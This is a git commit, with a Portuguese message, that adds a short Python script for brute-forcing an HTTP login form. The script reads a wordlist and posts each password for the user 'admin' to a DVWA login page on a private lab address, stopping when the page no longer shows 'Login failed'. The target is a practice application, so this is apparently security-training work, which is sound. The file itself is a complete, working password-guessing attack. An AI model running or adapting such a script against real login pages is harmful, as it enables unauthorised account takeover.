402754302cd92cb539c1d5df63c9c70e12e56031
MiguellArcanjo <contato.miguelarcanjo2305@gmail.com>
2026-04-13 00:02:41 -0300

    Script para fazer brute force em formularios http

---
+++ BruteForce/http_login_brute.py
@@ -0,0 +1,14 @@
+import requests
+
+
+with open("wordlist.txt", "r", encoding="latin-1") as file:
+    wordlist = file.read().splitlines()
+
+    for word in wordlist:
+        data = {"username": "admin", "password": word, "Login": "Login"}
+        response = requests.post("http://192.168.0.12/dvwa/login.php", data=data)
+        if "Login failed" in response.text:
+            print(f"Senha {word} incorreta")
+        else:
+            print(f"Senha {word} correta")
+            break
